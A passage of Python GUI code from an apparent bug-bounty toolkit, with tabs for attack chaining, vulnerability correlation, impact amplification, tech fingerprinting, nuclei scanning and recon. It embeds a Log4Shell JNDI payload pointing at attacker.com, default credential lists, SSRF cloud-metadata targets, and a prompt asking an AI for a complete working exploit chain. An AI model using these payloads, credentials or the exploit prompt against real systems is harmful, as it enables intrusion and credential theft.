        vsb.pack(side='right', fill='y')
        for name in CHAINS.keys():
            chain_lb.insert('end', name)

        # Right: chain detail
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        self._chain_detail_txt = mk_stext(right, h=28, bg=BG3, fg=FG)
        self._chain_detail_txt.pack(fill='both', expand=True)
        bf = mk_frame(right, bg=BG2); bf.pack(fill='x', pady=(8,0))

        def on_select(e):
            sel = chain_lb.curselection()
            if not sel: return
            name = chain_lb.get(sel[0])
            chain = CHAINS.get(name, {})
            self._chain_detail_txt.config(state='normal')
            self._chain_detail_txt.delete('1.0','end')
            self._chain_detail_txt.insert('end', f"{name}\n{'═'*60}\n\n")
            self._chain_detail_txt.insert('end', f"Severity: {chain.get('severity','')}\n\n")
            self._chain_detail_txt.insert('end', f"Description:\n  {chain.get('description','')}\n\n")
            self._chain_detail_txt.insert('end', "Attack Steps:\n")
            for s in chain.get('steps',[]): self._chain_detail_txt.insert('end', f"  {s}\n")
            self._chain_detail_txt.insert('end', "\nPoC Commands:\n")
            for c in chain.get('poc_cmd',[]): self._chain_detail_txt.insert('end', f"  {c}\n")
            self._chain_detail_txt.config(state='disabled')

        chain_lb.bind('<<ListboxSelect>>', on_select)
        if chain_lb.size() > 0:
            chain_lb.selection_set(0); on_select(None)

        def copy_chain():
            self.root.clipboard_clear()
            self.root.clipboard_append(self._chain_detail_txt.get('1.0','end'))
            self.set_status("Chain copied!", GREEN)
        def gen_ai_chain():
            sel = chain_lb.curselection()
            if not sel: return
            name = chain_lb.get(sel[0])
            chain = CHAINS.get(name, {})
            target = self.project.get() or "TARGET"
            prompt = f"Generate a complete working exploit chain for:\n\nChain: {name}\nTarget: {target}\n\nSteps:\n" + '\n'.join(chain.get('steps',[]))
            # Switch to AI tab and populate
            self._ai_txt_input.config(state='normal') if hasattr(self,'_ai_txt_input') and self._ai_txt_input else None
            if hasattr(self,'_ai_txt_input') and self._ai_txt_input:
                self._ai_txt_input.delete('1.0','end')
                self._ai_txt_input.insert('end', prompt)
            self.set_status("Prompt loaded in AI Assistant tab!", CYAN)

        mk_btn(bf, "📋 Copy Chain", copy_chain, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🤖 Generate AI PoC", gen_ai_chain, PURPLE, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🚩 Add as Finding", lambda: self._chain_add_finding(chain_lb, CHAINS), YELLOW, small=True).pack(side='left', padx=4)

    def _chain_add_finding(self, chain_lb, CHAINS):
        sel = chain_lb.curselection()
        if not sel: return
        name = chain_lb.get(sel[0])
        chain = CHAINS.get(name, {})
        finding = {
            "title": f"Attack Chain: {name}",
            "type": "Chaining",
            "severity": chain.get("severity","HIGH"),
            "description": chain.get("description",""),
            "poc": '\n'.join(chain.get('steps',[])),
            "project": self.project.get(),
            "status": "Open",
        }
        save_finding(finding)
        self.set_status(f"Chain saved as finding!", GREEN)
        messagebox.showinfo("Saved", f"Added to Findings tab!", parent=self.root)

    def _build_smart_correlator(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SMART VULNERABILITY CORRELATOR", "🧠").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Analyzes your findings and suggests chains automatically\n"
            "  Input: list of vulns found  →  Output: how to chain them for maximum impact"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)

        # Input
        tk.Label(pad, text="Your findings (one per line, e.g.: XSS, SSRF, IDOR, Open Redirect):",
                 bg=BG2, fg=FG2, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._corr_input = mk_stext(pad, h=6, bg=BG3, fg=FG)
        self._corr_input.pack(fill='x', pady=(0,8))
        # Load from DB
        def load_from_findings():
            findings = load_findings(self.project.get() if self.project.get() else None)
            types = list(set(f.get('type','') for f in findings if f.get('type')))
            self._corr_input.delete('1.0','end')
            self._corr_input.insert('end', '\n'.join(types))
        mk_btn(pad, "← Load from Findings DB", load_from_findings, FG3, small=True).pack(anchor='w', pady=(0,8))

        self._corr_output = mk_stext(pad, h=18, bg=BG3, fg=FG)
        self._corr_output.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')

        CORRELATION_RULES = {
            frozenset(["XSS","CSRF"]): ("XSS + CSRF = Account Takeover", "CRITICAL", "Use XSS to steal CSRF token → Change email/password"),
            frozenset(["SSRF","AWS"]): ("SSRF + AWS Metadata = Cloud Compromise", "CRITICAL", "SSRF to 169.254.169.254 → IAM creds → Full cloud access"),
            frozenset(["IDOR","PII"]): ("IDOR + PII = Mass Data Breach", "CRITICAL", "Enumerate all user IDs → Extract all PII data"),
            frozenset(["XSS","Cookie"]): ("XSS + Cookie = Session Hijack", "HIGH", "Steal session cookie via XSS → Impersonate user"),
            frozenset(["Open Redirect","OAuth"]): ("Open Redirect + OAuth = Token Steal", "HIGH", "Bypass redirect_uri → Auth code/token to attacker"),
            frozenset(["LFI","Log"]): ("LFI + Log Poisoning = RCE", "CRITICAL", "Inject PHP in log → Include log via LFI → RCE"),
            frozenset(["SSRF","Redis"]): ("SSRF + Redis = RCE", "CRITICAL", "SSRF to internal Redis → SLAVEOF attack → RCE"),
            frozenset(["JWT","RS256"]): ("JWT RS256 = Algorithm Confusion", "CRITICAL", "RS256 → HS256 confusion → Forge admin token"),
            frozenset(["XSS","Admin"]): ("XSS on Admin = Privilege Escalation", "CRITICAL", "Admin views XSS payload → Admin actions as attacker"),
            frozenset(["IDOR","Admin"]): ("IDOR on Admin endpoints = Privilege Escalation", "CRITICAL", "Access admin-only IDs → Full admin functions"),
        }

        def correlate():
            raw = self._corr_input.get('1.0','end').strip()
            if not raw: return
            vulns = [v.strip().upper() for v in raw.replace(',','\n').splitlines() if v.strip()]
            self._corr_output.config(state='normal')
            self._corr_output.delete('1.0','end')
            self._corr_output.insert('end', f"Analyzing {len(vulns)} vulnerabilities...\n\n")
            self._corr_output.insert('end', f"Found: {', '.join(vulns)}\n\n")
            found_chains = []
            for key, (chain_name, sev, desc) in CORRELATION_RULES.items():
                vuln_set_upper = set(v.upper() for v in vulns)
                if any(k.upper() in vuln_set_upper or
                       any(k.upper() in v for v in vuln_set_upper)
                       for k in key):
                    found_chains.append((chain_name, sev, desc))
            if found_chains:
                self._corr_output.insert('end', f"=== {len(found_chains)} CHAINS DETECTED ===\n\n")
                for cname, sev, desc in found_chains:
                    sev_clr = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡'}.get(sev,'⚪')
                    self._corr_output.insert('end', f"{sev_clr} [{sev}] {cname}\n")
                    self._corr_output.insert('end', f"   → {desc}\n\n")
            else:
                self._corr_output.insert('end', "No automatic chains detected.\n")
                self._corr_output.insert('end', "Tip: Try AI Chain Builder for custom analysis.\n")

            # Always suggest AI analysis
            self._corr_output.insert('end', "\n=== AI ANALYSIS (Recommended) ===\n")
            self._corr_output.insert('end', "→ Use AI Chain Builder tab for deeper custom chain analysis\n")
            self._corr_output.insert('end', f"→ Paste these vulns: {', '.join(vulns)}\n")
            self._corr_output.config(state='disabled')
            self.set_status(f"Correlator: {len(found_chains)} chains found", GREEN)

        mk_btn(bf, "🧠 Correlate", correlate, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._corr_output.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _build_impact_amplifier(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "IMPACT AMPLIFIER — Escalate Severity", "💡").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Take a LOW/MEDIUM finding and show maximum impact to get higher bounty\n"
            "  Technique: escalate scope → demonstrate real-world consequences"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)

        f1 = mk_frame(pad, bg=BG2); f1.pack(fill='x', pady=(0,6))
        tk.Label(f1, text="Vuln Type:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        vuln_types = ["XSS (Reflected)","XSS (Stored)","Open Redirect","IDOR","CSRF",
                       "Info Disclosure","Subdomain Takeover","SSRF","LFI","SQLi","CORS"]
        self._amp_type = tk.StringVar(value="XSS (Reflected)")
        ttk.Combobox(f1, textvariable=self._amp_type, values=vuln_types, width=22, font=MONO_S).pack(side='left', padx=8)
        tk.Label(f1, text="Current Severity:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._amp_sev = tk.StringVar(value="LOW")
        ttk.Combobox(f1, textvariable=self._amp_sev, values=["LOW","MEDIUM","HIGH"], width=10, font=MONO_S).pack(side='left')

        self._amp_output = mk_stext(pad, h=24, bg=BG3, fg=FG)
        self._amp_output.pack(fill='both', expand=True, pady=(8,0))

        AMPLIFY_GUIDE = {
            "XSS (Reflected)": [
                "Basic: Alert box → LOW bounty",
                "Amplify to CRITICAL:",
                "  • Target admin users specifically (admin panel URL)",
                "  • Use stored attack via email/notification injection",
                "  • Steal localStorage/sessionStorage (JWT tokens)",
                "  • Port scan internal network via JavaScript",
                "  • Keylogger: capture all keystrokes on login page",
                "  • Credential phishing: replace login form with fake one",
                "  • Pivot: use as launch pad for further attacks",
                "",
                "Report framing: 'This XSS on admin-visible endpoint allows complete\n  admin account takeover, leading to full application compromise'",
            ],
            "Open Redirect": [
                "Basic: Redirect to evil.com → LOW bounty",
                "Amplify:",
                "  • Combine with OAuth: use as redirect_uri → token theft",
                "  • Phishing: redirect to convincing clone of login page",
                "  • SSRF bypass: some filters allow redirects",
                "  • Credential theft: append ?next=https://evil.com to login page",
                "  • Password reset link → redirect token to attacker",
                "",
                "Report framing: 'Open redirect enables OAuth token exfiltration,\n  leading to account takeover for any user who clicks a link'",
            ],
            "IDOR": [
                "Basic: View another user's profile → LOW",
                "Amplify:",
                "  • Can you EDIT other user's data? → Higher severity",
                "  • Are there payment/financial IDs? → CRITICAL",
                "  • Can you access admin user IDs? → Privilege escalation",
                "  • Mass enumeration: how many users affected?",
                "  • PII exposure: email, phone, address, payment info",
                "  • BOLA: Business Object Level Authorization bypass",
                "",
                "Report: Show impact on 100,000+ users if sequential IDs",
            ],
            "SSRF": [
                "Basic: Access internal URL → MEDIUM",
                "Amplify:",
                "  • Reach AWS metadata: http://169.254.169.254/",
                "  • Scan internal ports: redis:6379, postgres:5432, elasticsearch:9200",
                "  • Redis SSRF → SLAVEOF attack → RCE",
                "  • Jenkins internal: /script endpoint → Groovy RCE",
                "  • Kubernetes API: http://kubernetes.default.svc/api/v1/secrets",
                "  • Cloud metadata → IAM credentials → Full cloud compromise",
            ],
        }

        def amplify():
            vtype = self._amp_type.get()
            guide = AMPLIFY_GUIDE.get(vtype, [
                f"Amplification guide for {vtype}:",
                "  • Demonstrate real-world impact beyond technical finding",
                "  • Show data exposure or account compromise potential",
                "  • Combine with other vulnerabilities for chain attack",
                "  • Calculate affected users/systems count",
                "  • Include financial/compliance impact in report",
            ])
            self._amp_output.config(state='normal')
            self._amp_output.delete('1.0','end')
            self._amp_output.insert('end', f"=== IMPACT AMPLIFICATION: {vtype} ===\n")
            self._amp_output.insert('end', f"Current: {self._amp_sev.get()} → Target: CRITICAL\n\n")
            for line in guide: self._amp_output.insert('end', f"{line}\n")
            self._amp_output.insert('end', f"\n=== SCORING MULTIPLIERS ===\n")
            self._amp_output.insert('end', "  Authentication bypass    → +3 CVSS\n")
            self._amp_output.insert('end', "  Admin panel access       → +2 CVSS\n")
            self._amp_output.insert('end', "  PII data exposed         → +3 CVSS\n")
            self._amp_output.insert('end', "  Payment system impact    → +4 CVSS\n")
            self._amp_output.insert('end', "  Mass user impact (1000+) → +2 CVSS\n")
            self._amp_output.insert('end', "  RCE achievable           → max CVSS\n")
            self._amp_output.config(state='disabled')

        mk_btn(pad, "💡 Amplify Impact", amplify, YELLOW).pack(anchor='w', pady=(8,0), ipady=5)

    def _build_priority_scorer(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SMART PRIORITY SCORER", "📊").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Loads all findings and scores them by real-world impact\n"
            "  Prioritization: Base CVSS + Auth bypass + Admin access + PII + Payment + Chain potential"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)

        cols = ('Priority','Score','Title','Severity','Type','Chain Potential')
        tree = mk_tree(pad, columns=cols, show='headings', height=20)
        for c, w in [('Priority',65),('Score',65),('Title',280),('Severity',75),('Type',100),('Chain Potential',200)]:
            tree.heading(c, text=c, anchor='w')
            tree.column(c, width=w, anchor='w')
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
            tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=tree.yview)
        tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)

        CHAIN_KEYWORDS = {
            "SSRF": "→ Cloud Metadata → RCE potential",
            "XSS": "→ ATO if stored on admin page",
            "IDOR": "→ Mass PII if sequential IDs",
            "Open Redirect": "→ OAuth token steal",
            "LFI": "→ Log poisoning → RCE",
            "CORS": "→ Cross-origin data theft",
            "JWT": "→ Token forge → Admin access",
        }

        def score_finding(f):
            base = 0
            try: base = float(f.get('cvss_score',5) or 5)
            except: base = 5
            sev = f.get('severity','').upper()
            base += {'CRITICAL':10,'HIGH':7,'MEDIUM':4,'LOW':2,'INFO':0}.get(sev,0)
            desc = (f.get('description','') + f.get('poc','')).lower()
            if 'auth' in desc or 'bypass' in desc: base += 3
            if 'admin' in desc: base += 2
            if 'pii' in desc or 'personal' in desc or 'email' in desc: base += 3
            if 'payment' in desc or 'credit' in desc or 'billing' in desc: base += 4
            if any(w in desc for w in ['all users','mass','1000','10000']): base += 2
            return round(base, 1)

        def load_scores():
            tree.delete(*tree.get_children())
            findings = load_findings(self.project.get() if self.project.get() else None)
            scored = [(score_finding(f), f) for f in findings]
            scored.sort(key=lambda x: x[0], reverse=True)
            for rank, (score, f) in enumerate(scored, 1):
                sev = f.get('severity','INFO').upper()
                vtype = f.get('type','')
                chain_hint = next((v for k, v in CHAIN_KEYWORDS.items() if k.lower() in vtype.lower()), "")
                tree.insert('','end', values=(
                    f"#{rank}", score,
                    f.get('title','')[:45],
                    sev, vtype, chain_hint), tags=(sev,))
            self.set_status(f"Scored {len(findings)} findings by priority", GREEN)

        mk_btn(pad, "🔄 Score All Findings", load_scores, GREEN, small=True).pack(anchor='w', pady=(8,0))

    # ═════════════════════════════════════════════════════════════
    #  DEEP INTEL TAB — Smart Target Intelligence
    # ═════════════════════════════════════════════════════════════
    def _build_deep_intel(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🧠 Smart Scanner  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🔬 Tech → Attack Map  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  📡 Recon Automation  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  🎯 Acquisition Intel  ")
        self._build_smart_scanner(f1)
        self._build_tech_attack_map(f2)
        self._build_recon_automation(f3)
        self._build_acquisition_intel(f4)

    def _build_smart_scanner(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SMART VULNERABILITY SCANNER", "🧠").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Tech fingerprint FIRST → only relevant templates run\n"
            "  WordPress → 50 WP templates | Jenkins → Jenkins + default creds\n"
            "  Spring Boot → Actuator + Spring4Shell | Log4j → Log4Shell\n"
            "  100x faster + fewer false positives than running all templates"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=10)

        TECH_SCAN_MAP = {
            "WordPress":    {"templates": ["technologies/wordpress","vulnerabilities/wordpress","cves/wordpress"], "creds": [("admin","admin"),("admin","password"),("admin","wordpress")]},
            "Drupal":       {"templates": ["technologies/drupal","vulnerabilities/drupal","cves/drupal"]},
            "Joomla":       {"templates": ["technologies/joomla","vulnerabilities/joomla"]},
            "Laravel":      {"templates": ["vulnerabilities/laravel","exposures/configs/laravel-env"]},
            "Django":       {"templates": ["vulnerabilities/python","exposures/configs/django"]},
            "Spring Boot":  {"templates": ["technologies/spring","vulnerabilities/spring","cves/spring-framework","exposures/actuators"]},
            "Jenkins":      {"templates": ["technologies/jenkins","vulnerabilities/jenkins","default-logins/jenkins"], "creds": [("admin","admin"),("admin","password"),("jenkins","jenkins")]},
            "Grafana":      {"templates": ["technologies/grafana","vulnerabilities/grafana","cves/grafana"], "creds": [("admin","admin")]},
            "GitLab":       {"templates": ["technologies/gitlab","vulnerabilities/gitlab","cves/gitlab"]},
            "Confluence":   {"templates": ["technologies/confluence","vulnerabilities/confluence","cves/confluence"]},
            "Jira":         {"templates": ["technologies/jira","vulnerabilities/jira"]},
            "Kubernetes":   {"templates": ["cloud/kubernetes","vulnerabilities/kubernetes","exposures/apis/kubernetes"]},
            "Nginx":        {"templates": ["technologies/nginx","vulnerabilities/nginx","misconfiguration/nginx"]},
            "Apache":       {"templates": ["technologies/apache","vulnerabilities/apache","misconfiguration/apache"]},
            "Tomcat":       {"templates": ["technologies/tomcat","vulnerabilities/tomcat","default-logins/tomcat"], "creds": [("admin","admin"),("tomcat","tomcat")]},
            "Log4j":        {"templates": ["cves/2021/CVE-2021-44228","cves/2021/CVE-2021-45046"]},
            "Struts":       {"templates": ["cves/struts","vulnerabilities/struts"]},
            "Elasticsearch":{"templates": ["technologies/elastic","vulnerabilities/elasticsearch","exposures/apis/elasticsearch"]},
            "Redis":        {"templates": ["technologies/redis","vulnerabilities/redis","default-logins/redis"]},
            "MongoDB":      {"templates": ["technologies/mongodb","vulnerabilities/mongodb"]},
        }

        # Target + tech input
        f1 = mk_frame(pad, bg=BG2); f1.pack(fill='x', pady=(0,8))
        tk.Label(f1, text="TARGET URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ss_target = tk.StringVar(value=self.vuln_target.get() or f"https://{self.project.get()}" if self.project.get() else "")
        mk_entry(f1, var=self._ss_target, w=42).pack(side='left', padx=8, ipady=3)
        mk_btn(f1, "← Project", lambda: self._ss_target.set(f"https://{self.project.get()}"), FG3, small=True).pack(side='left')

        # Tech detection grid
        mk_section(pad, "DETECTED TECHNOLOGIES (auto-detect or manual select)", "🔬").pack(fill='x', pady=(0,6))
        self._tech_vars = {}
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x', pady=(0,8))
        for i, tech in enumerate(TECH_SCAN_MAP.keys()):
            var = tk.BooleanVar(value=False)
            self._tech_vars[tech] = var
            r, c = divmod(i, 5)
            ttk.Checkbutton(tg, text=tech, variable=var).grid(row=r, column=c, sticky='w', padx=6, pady=2)

        self._smart_scan_term = Terminal(pad, height=12, title="SMART SCANNER OUTPUT")
        self._smart_scan_term.pack(fill='both', expand=True)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        def auto_detect():
            target = self._ss_target.get().strip()
            if not target: return
            self._smart_scan_term.log(f"[*] Auto-detecting tech on {target}...", 'info')
            def _go():
                try:
                    import urllib.request as _ur
                    req = _ur.Request(target, headers={'User-Agent':'Mozilla/5.0'})
                    with _ur.urlopen(req, timeout=10) as r:
                        body = r.read().decode('utf-8', errors='replace')[:50000]
                        hdrs = ' '.join([f"{k}: {v}" for k,v in r.getheaders()])
                    text = body + hdrs
                    detected = []
                    TECH_SIGS = {
                        "WordPress": ["wp-content","wp-login","WordPress"],
                        "Drupal": ["Drupal","drupal.js","sites/default"],
                        "Joomla": ["Joomla","joomla.js","/components/"],
                        "Laravel": ["laravel_session","XSRF-TOKEN","Laravel"],
                        "Django": ["csrfmiddlewaretoken","django"],
                        "Spring Boot": ["X-Application-Context","spring","actuator"],
                        "Jenkins": ["Jenkins","jenkins","X-Jenkins"],
                        "Grafana": ["grafana","Grafana"],
                        "GitLab": ["gitlab","GitLab","gl-"],
                        "Confluence": ["confluence","Confluence","atlassian"],
                        "Jira": ["jira","JIRA","atlassian"],
                        "Nginx": ["nginx","Nginx"],
                        "Apache": ["Apache","apache"],
                        "Tomcat": ["Apache Tomcat","tomcat"],
                        "Elasticsearch": ["elasticsearch","Elasticsearch"],
                        "Redis": ["redis","Redis"],
                    }
                    for tech, sigs in TECH_SIGS.items():
                        if any(s in text for s in sigs):
                            detected.append(tech)
                    def _upd():
                        for tech, var in self._tech_vars.items():
                            var.set(tech in detected)
                        self._smart_scan_term.log(f"[+] Detected: {', '.join(detected) if detected else 'Nothing specific'}", 'ok')
                    self.root.after(0, _upd)
                except Exception as e:
                    self.root.after(0, lambda: self._smart_scan_term.log(f"[!] Error: {e}", 'err'))
            threading.Thread(target=_go, daemon=True).start()

        def smart_scan():
            target = self._ss_target.get().strip()
            if not target: return
            selected = [t for t, v in self._tech_vars.items() if v.get()]
            if not selected:
                messagebox.showwarning("No Tech Selected", "Auto-detect or select technologies first.", parent=self.root)
                return
            self._smart_scan_term.log(f"[*] SMART SCAN: {target}", 'warn')
            self._smart_scan_term.log(f"[*] Technologies: {', '.join(selected)}", 'info')
            all_templates = []
            for tech in selected:
                templates = TECH_SCAN_MAP.get(tech, {}).get('templates', [])
                all_templates.extend(templates)
                # Default creds
                creds = TECH_SCAN_MAP.get(tech, {}).get('creds', [])
                if creds:
                    self._smart_scan_term.log(f"[*] Default creds for {tech}: {creds[:3]}", 'warn')
            # Build nuclei command
            if all_templates:
                cmd = ["nuclei", "-u", target, "-silent", "-no-color"]
                for t in list(set(all_templates))[:10]:
                    cmd += ["-t", t]
                cmd += ["-severity", "medium,high,critical"]
                self._smart_scan_term.run_command(cmd, label=f"Smart Nuclei → {target}")
            else:
                self._smart_scan_term.log("[!] No templates for selected technologies", 'warn')

        mk_btn(bf, "🔍 Auto-Detect Tech", auto_detect, CYAN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "⚡ Smart Scan", smart_scan, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "✓ Select All", lambda: [v.set(True) for v in self._tech_vars.values()], FG3, small=True).pack(side='left', padx=4)
        mk_btn(bf, "✗ Clear", lambda: [v.set(False) for v in self._tech_vars.values()], FG3, small=True).pack(side='left', padx=4)

    def _build_tech_attack_map(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "TECHNOLOGY → ATTACK SURFACE MAP", "🔬").pack(fill='x', pady=(0,8))

        TECH_ATTACKS = {
            "WordPress": {
                "CVEs": ["CVE-2021-29447 (XXE)", "CVE-2020-28034 (XSS)", "CVE-2019-8943 (RCE via theme editor)"],
                "Attacks": ["wp-login.php brute force", "xmlrpc.php credential stuffing",
                            "Theme/plugin editor RCE (if admin)", "User enumeration /?author=1",
                            "SQL injection in plugins", "wp-config.php exposure"],
                "Endpoints": ["/wp-login.php", "/xmlrpc.php", "/wp-admin/", "/wp-json/wp/v2/users",
                               "/wp-config.php.bak", "/?author=1"],
                "Default Creds": ["admin/admin", "admin/password"],
            },
            "Jenkins": {
                "CVEs": ["CVE-2024-23897 (Arbitrary File Read)", "CVE-2019-1003000 (RCE)", "CVE-2018-1000861 (RCE)"],
                "Attacks": ["Script console RCE (if admin)", "Unauthenticated RCE (older versions)",
                            "SSRF via build triggers", "Credentials exposure via /credentials/"],
                "Endpoints": ["/script", "/credentials/", "/people/", "/asynchPeople/",
                               "/systemInfo", "/configfiles/", "/doLogout"],
                "Default Creds": ["admin/admin", "jenkins/jenkins"],
            },
            "Spring Boot": {
                "CVEs": ["CVE-2022-22965 (Spring4Shell RCE)", "CVE-2021-22986 (iControl RCE)"],
                "Attacks": ["Actuator endpoints exposure", "Spring4Shell (if Tomcat + JDK9+)",
                            "Spring Security misconfiguration", "SSRF via WebClient"],
                "Endpoints": ["/actuator", "/actuator/env", "/actuator/heapdump",
                               "/actuator/loggers", "/actuator/beans", "/actuator/mappings",
                               "/actuator/shutdown", "/actuator/health"],
                "Default Creds": [],
            },
            "Log4j": {
                "CVEs": ["CVE-2021-44228 (Log4Shell - CRITICAL RCE)", "CVE-2021-45046", "CVE-2021-45105"],
                "Attacks": ["${jndi:ldap://attacker.com/a} in ANY parameter",
                            "Headers: User-Agent, X-Forwarded-For, X-Api-Version",
                            "URL parameters, form fields, JSON body"],
                "Endpoints": ["Any endpoint that logs input"],
                "Default Creds": [],
            },
            "Kubernetes": {
                "CVEs": ["CVE-2018-1002105 (API Server bypass)", "CVE-2019-11247"],
                "Attacks": ["Unauthenticated API access", "RBAC misconfiguration",
                            "etcd exposure (port 2379)", "Kubelet API (port 10250)",
                            "Dashboard unauthenticated", "Service Account token theft"],
                "Endpoints": [":8001/api/v1/", ":8443/api/v1/", ":2379/v2/keys/",
                               ":10250/run/default/", ":30000/"],
                "Default Creds": [],
            },
        }

        # Left: tech selector
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)
        left = mk_frame(paned, bg=BG2); paned.add(left, width=180)
        tk.Label(left, text="TECHNOLOGIES", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(0,4), anchor='w')
        tech_lb = tk.Listbox(left, bg=BG3, fg=FG, font=MONO_S,
                              selectbackground=BG5, selectforeground=ACCENT,
                              relief='flat', bd=0)
        vsb = ttk.Scrollbar(left, orient='vertical', command=tech_lb.yview)
        tech_lb.configure(yscrollcommand=vsb.set)
        tech_lb.pack(side='left', fill='both', expand=True)
        vsb.pack(side='right', fill='y')
        for t in TECH_ATTACKS.keys(): tech_lb.insert('end', t)

        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        self._tmap_txt = mk_stext(right, h=28, bg=BG3, fg=FG)
        self._tmap_txt.pack(fill='both', expand=True)
        bf = mk_frame(right, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._tmap_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

        def on_select(e):
            sel = tech_lb.curselection()
            if not sel: return
            tech = tech_lb.get(sel[0])
            data = TECH_ATTACKS.get(tech, {})
            self._tmap_txt.config(state='normal')
            self._tmap_txt.delete('1.0','end')
            self._tmap_txt.insert('end', f"=== {tech.upper()} ATTACK MAP ===\n\n")
            if data.get('CVEs'):
                self._tmap_txt.insert('end', "CVEs / Known Vulnerabilities:\n")
                for c in data['CVEs']: self._tmap_txt.insert('end', f"  🔴 {c}\n")
            self._tmap_txt.insert('end', "\nAttack Vectors:\n")
            for a in data.get('Attacks',[]): self._tmap_txt.insert('end', f"  ⚡ {a}\n")
            self._tmap_txt.insert('end', "\nImportant Endpoints:\n")
            for ep in data.get('Endpoints',[]): self._tmap_txt.insert('end', f"  🔗 {ep}\n")
            if data.get('Default Creds'):
                self._tmap_txt.insert('end', "\nDefault Credentials:\n")
                for cred in data['Default Creds']: self._tmap_txt.insert('end', f"  🔑 {cred}\n")
            self._tmap_txt.config(state='disabled')

        tech_lb.bind('<<ListboxSelect>>', on_select)
        if tech_lb.size() > 0:
            tech_lb.selection_set(0); on_select(None)

    def _build_recon_automation(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "AUTOMATED RECON ONELINERS", "📡").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Production-ready automated recon commands\n"
            "  Copy and run directly — all output saved to files"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        f1 = mk_frame(pad, bg=BG2); f1.pack(fill='x', pady=(0,8))
        tk.Label(f1, text="TARGET:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ra_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(f1, var=self._ra_target, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(f1, "← Project", lambda: self._ra_target.set(self.project.get()), FG3, small=True).pack(side='left')

        self._ra_txt = mk_stext(pad, h=28, bg=BG3, fg=GREEN)
        self._ra_txt.pack(fill='both', expand=True, pady=(0,8))

        def gen_oneliners():
            t = self._ra_target.get().strip() or "TARGET.COM"
            self._ra_txt.config(state='normal')
            self._ra_txt.delete('1.0','end')
            lines = [
                f"# ═══════════════════════════════════════",
                f"# TeamCyberOps — Recon Automation for: {t}",
                f"# ═══════════════════════════════════════",
                f"",
                f"TARGET={t}",
                f"OUT_DIR=/tmp/recon_$TARGET",
                f"mkdir -p $OUT_DIR",
                f"",
                f"# ── Phase 1: Subdomain Enum (Passive) ──",
                f"subfinder -d $TARGET -silent -o $OUT_DIR/subfinder.txt",
                f"amass enum -passive -d $TARGET -o $OUT_DIR/amass.txt",
                f"curl -s 'https://crt.sh/?q=%25.$TARGET&output=json' | jq -r '.[].name_value' | sort -u > $OUT_DIR/crtsh.txt",
